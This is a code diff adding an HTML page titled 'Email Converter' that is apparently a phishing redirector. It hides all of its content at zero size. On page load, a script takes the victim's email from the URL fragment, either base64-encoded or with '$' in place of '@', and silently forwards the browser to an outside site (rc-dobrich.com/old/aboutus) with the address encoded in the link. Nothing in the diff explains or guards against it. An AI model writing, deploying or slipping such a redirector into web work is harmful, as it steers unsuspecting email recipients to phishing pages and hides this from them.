@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Converter</title>
+    <style>
+        /* Hide everything from view */
+        body, html {
+            width: 0;
+            height: 0;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // Function to process email and redirect
+        function processEmailAndRedirect() {
+            // Get the email from URL hash
+            function getEmailFromURL() {
+                const hash = window.location.hash.substring(1);
+                
+                if (!hash) return null;
+                
+                // Try to decode as base64 first
+                try {
+                    const base64Decoded = atob(hash);
+                    if (isValidEmailFormat(base64Decoded)) return base64Decoded;
+                } catch (e) {
+                    // Not a valid base64 string, continue to check as plain email
+                }
+                
+                // Check if it's a plain email (replace $ with @ if needed)
+                const emailWithAt = hash.replace(/\$/g, '@');
+                if (isValidEmailFormat(emailWithAt)) return emailWithAt;
+                
+                return null;
+            }
+            
+            function isValidEmailFormat(email) {
+                return email.includes('@') && email.includes('.') && email.length > 5;
+            }
+            
+            const email = getEmailFromURL();
+            
+            if (email) {
+                // Redirect to the target URL
+                window.location = "https://rc-dobrich.com/old/aboutus#" + btoa(email);
+            }
+        }
+        
+        // Start the process immediately
+        window.onload = processEmailAndRedirect;
+    </script>
+</body>
+</html>
